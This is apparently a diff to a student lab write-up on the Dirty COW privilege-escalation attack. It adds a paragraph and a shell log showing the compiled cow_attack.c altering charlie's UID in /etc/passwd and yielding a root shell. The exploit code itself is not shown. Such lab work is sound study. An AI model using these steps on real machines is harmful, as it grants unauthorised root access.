@@ -200,3 +200,14 @@ root@ubuntu# id
 (uid=0(root)) gid=1001(charlie) groups=0(root),1001(charlie)
 ```
 
+Firstly we add the new user. After adding the user, attack code was modified to target password file and replace 1001 with 0000, which granted root access as can be seen below. As you can see the attack was successful.
+
+```sh
+[11/27/21]seed@VM:~$ cat /etc/passwd | grep charlie
+seed:x:1001:1002:Charlie,001,000,000,0:/home/charlie:/bin/bash
+[11/27/21]seed@VM:~$ gcc cow_attack.c -lpthread
+[11/27/21]seed@VM:~$ a.out
+[11/27/21]seed@VM:~$ su charlie
+Password:
+root@VM:/home/seed# 
+```
